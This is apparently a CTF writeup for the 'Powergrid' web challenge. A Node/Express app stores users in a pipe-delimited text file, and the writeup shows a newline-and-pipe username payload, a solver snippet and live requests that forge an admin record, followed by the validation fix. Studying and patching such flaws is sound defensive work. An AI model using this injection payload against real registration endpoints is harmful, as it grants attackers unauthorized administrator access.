<div align="center">

# Powergrid

### A flat-file record-injection writeup

![Category](https://img.shields.io/badge/category-Web-blue)
![Difficulty](https://img.shields.io/badge/difficulty-Easy-brightgreen)
![Stack](https://img.shields.io/badge/stack-Node.js%20%2F%20Express-339933)
![Vuln](https://img.shields.io/badge/vuln-CRLF%20%2F%20record%20injection-red)
![Flag](https://img.shields.io/badge/flag-redacted-lightgrey)

</div>

---

> [!NOTE]
> **TL;DR**: `PowerGrid Management System` stores its users in a hand-rolled, pipe-delimited `users.txt` "database". The registration endpoint never rejects `|` or `\n` in the username, so a single `POST /api/auth/register` can smuggle an extra, attacker-controlled record: role `admin` included: straight into the file. Logging back in authenticates against that forged record instead of the real one. No flag is included in this writeup.

The challenge ships as an in-browser code editor ("HTB Editor") sitting on top of a small file-management API, with the actual target: a Node/Express app called `PowerGrid Management System`: running underneath at `/challenge/`. The twist: you're handed the full source tree to read *and edit*, plus a reference exploit script, and the win condition is checked live by the platform itself rather than a static flag file.

**Goal:** find the auth flaw, patch the source through the editor, restart the service, and get the built-in verifier to confirm the fix.

## Table of Contents

- [Recon](#recon)
- [Reading the source](#reading-the-source)
- [The bug, in one line](#the-bug-in-one-line)
- [Exploit](#exploit)
  - [Proof against the live target](#proof-against-the-live-target)
- [The fix](#the-fix)
- [Confirming the patch](#confirming-the-patch)
- [Root cause & takeaways](#root-cause--takeaways)

---

## Recon

The root page is a Vite/React SPA titled **HTB Editor**. Its JS bundle is just an Axios client wired to a small file-management API under `/api`:

```
GET    /api/directory        # file tree
GET    /api/file?path=...    # read a file
POST   /api/create-file      # create a new file (errors if it already exists)
POST   /api/create-folder
DELETE /api/delete
POST   /api/rename
POST   /api/upload
POST   /api/restart          # restarts the target Node app
GET    /api/verify           # runs the win-condition check
```

`GET /api/directory` dumps the actual project being edited:

```
index.js
package.json
routes/auth.js
routes/views.js
utils/db.js
users.txt
templates/{index,dashboard,admin}.html
exploit/solver.py   <-- a reference exploit is bundled with the challenge
```

and `GET /api/verify` starts out with:

```json
{ "error": "Application vulnerability is not patched." }
```: which is the actual win condition for this challenge: get that to flip.

## Reading the source

`index.js` is a plain Express app: `express-session` for auth state, two route groups (`routes/auth.js` under `/api/auth`, `routes/views.js` for pages) mounted under a `/challenge` base path.

`routes/views.js` does the access control on the dashboard, and does it the *right* way: server-side, off the session, not off anything the client sends:

```js
router.get('/dashboard', (req, res) => {
    if (!req.session.username) return res.redirect('/');
    if (req.session.role === 'admin') {
        res.sendFile(path.join(__dirname, '..', 'templates', 'admin.html'));
    } else {
        res.sendFile(path.join(__dirname, '..', 'templates', 'dashboard.html'));
    }
});
```

So the bug isn't in the routing: it's in how `req.session.role` gets set in the first place. That leads to `utils/db.js`, which is where things get interesting: there's no real database, just a text file.

```js
const USERS_FILE = path.join(__dirname, '..', 'users.txt');

export function writeUsers(users) {
    const data = users.map(u => `${u.username}|${u.password}|${u.role}`).join('\n');
    fs.writeFileSync(USERS_FILE, data + '\n', 'utf8');
}

export function findUserByUsername(username) {
    const users = readUsers();
    return users.find(u => u.username === username);   // first match wins
}

export function addUser(username, password, role = 'operator') {
    const users = readUsers();
    if (users.find(u => u.username === username)) return false;
    users.push({ username, password: hashPassword(password), role });
    return writeUsers(users);
}
```

`addUser()` takes `username` straight from `routes/auth.js`'s `POST /api/auth/register` body and writes it into a `|`-delimited, `\n`-separated flat file: **with zero validation.**

> [!TIP]
> Any time a "database" is really just `field1|field2|field3` joined with `\n`, ask the same question you'd ask about SQL or an HTTP header: can an attacker put the *separator itself* into a field? If yes, they can forge extra fields or entire extra rows.

## The bug, in one line

A username of

```
<name>|<sha256("CoolPassword17!")>|admin
<name>
```

is a single string as far as `addUser()`'s duplicate-check is concerned (no existing user matches that whole blob), but once written out and joined with `\n` it becomes **two lines** in `users.txt`:

```
<name>|<attacker-chosen hash>|admin
<name>|<real sha256 of the submitted password>|operator
```

`findUserByUsername()` uses `Array.find()`, which returns the **first** match: the forged `admin` line, so logging in as `<name>` / `CoolPassword17!` authenticates against the injected record instead of the legitimate one that was "really" registered.

**Classification:** improper neutralization of a record/field delimiter in output used by a downstream component ([CWE-93 / CRLF Injection](https://cwe.mitre.org/data/definitions/93.html)): structurally the same class of bug as SQL injection or HTTP request/response splitting, just against a hand-rolled flat-file store instead of a real DB or a network protocol.

## Exploit

Two requests, no admin credentials needed anywhere:

1. `POST /api/auth/register` with the crafted username above and password `CoolPassword17!`.
2. `POST /api/auth/login` with the *clean* username and the same password → session comes back with `role: "admin"`.

The challenge ships this exact attack as a reference (`exploit/solver.py`):

```python
payload = f"{username}|{sha256('CoolPassword17!')}|admin\n{username}"
register_user(payload, "CoolPassword17!")
cookies = login_user(username, "CoolPassword17!").cookies
# GET /dashboard now serves admin.html
```

### Proof against the live target

```
POST /challenge/api/auth/register
{"username": "victim|4befd7f7...9a7aef|admin\nvictim", "password": "CoolPassword17!"}
→ {"success": true, "message": "Registration successful"}

POST /challenge/api/auth/login
{"username": "victim", "password": "CoolPassword17!"}
→ {"success": true, "message": "Login successful", "user": {"username": "victim", "role": "admin"}}

GET /challenge/dashboard   (with the returned session cookie)
→ <title>PowerGrid - Administrator Control</title>
```

Unauthenticated registration endpoint → full admin session, no password guessing, no brute force.

## The fix

The actual bug is *no validation at the trust boundary*: the moment untrusted input is about to be persisted into a delimiter-based format. Root-causing it there beats trying to patch every place that later reads `users.txt`:

```diff
+function isValidUsername(username) {
+    return typeof username === 'string' &&
+        username.length > 0 &&
+        username.length <= 64 &&
+        /^[^|\r\n]+$/.test(username);
+}

 export function addUser(username, password, role = 'operator') {
+    if (!isValidUsername(username)) return false;
     const users = readUsers();
     if (users.find(u => u.username === username)) return false;
     users.push({ username, password: hashPassword(password), role });
     return writeUsers(users);
 }
```

Applied it through the editor's own file API: `create-file` refuses to overwrite an existing path, so it's `DELETE /api/delete` on the old `utils/db.js` followed by `POST /api/create-file` with the patched version: then `POST /api/restart` to reload the Node process.

## Confirming the patch

Re-sending the exact same injection payload post-patch:

```
POST /challenge/api/auth/register
{"username": "poc.../admin\npoc...", "password": "CoolPassword17!"}
→ {"success": false, "error": "Username already exists or registration failed"}
```

The malformed username is rejected outright now, so `users.txt` can never gain more lines than there are legitimate registrations, and no role can be smuggled in through the username field.

```
GET /api/verify
→ { "flag": "HTB{redacted}" }
```

## Root cause & takeaways

- **Don't build a "database" out of hand-delimited text without escaping (or rejecting) the delimiter in user-controlled fields.** Same bug family as SQL injection and HTTP CRLF injection: untrusted data crossing into a format where certain characters are structurally meaningful.
- **A duplicate-key check is only as good as the notion of "key" it's actually enforcing.** `addUser()` checked for an exact-string duplicate `username`, not a duplicate *effective* username once newlines could split it into more than one record.
- **Validate at the boundary where data is persisted, not scattered across every route that later reads it back.** The one-line fix belongs in `addUser()`.
- Correct, server-side authorization logic (as in `routes/views.js`) is worthless if the underlying *data* that decision reads from can be forged upstream. Always trace a `role`/`isAdmin` check back to where it was originally written, not just where it's read.

---

<div align="center">

`web` · `nodejs` · `express` · `crlf-injection` · `privilege-escalation` · `ctf-writeup`

*Writeup for personal/educational purposes. No flag is included above: solve it yourself.*

</div>
